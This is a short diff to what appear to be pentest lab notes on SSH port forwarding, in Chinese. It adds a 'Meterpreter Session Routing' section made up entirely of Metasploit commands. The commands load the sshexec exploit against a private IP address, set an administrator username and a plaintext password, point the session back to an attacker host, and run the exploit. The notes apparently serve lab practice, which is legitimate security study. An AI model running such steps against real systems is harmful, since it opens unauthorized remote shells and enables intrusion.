@@ -82,5 +82,15 @@ SSH Local Port Forwarding /w Jump Host
     斷開連線後就無法連線
 ![image](https://github.com/user-attachments/assets/5e11cc9b-2d0d-4f57-8534-5a1065658791)
 
+Meterpreter Session Routing
+---
 
+    1.MSF
+    msfconsole
+    use exploit/multi/ssh/sshexec
+    set rhosts 172.19.19.70
+    set username administrator
+    set password Infinit3
+    set lhost 172.19.19.18
+    exploit
 
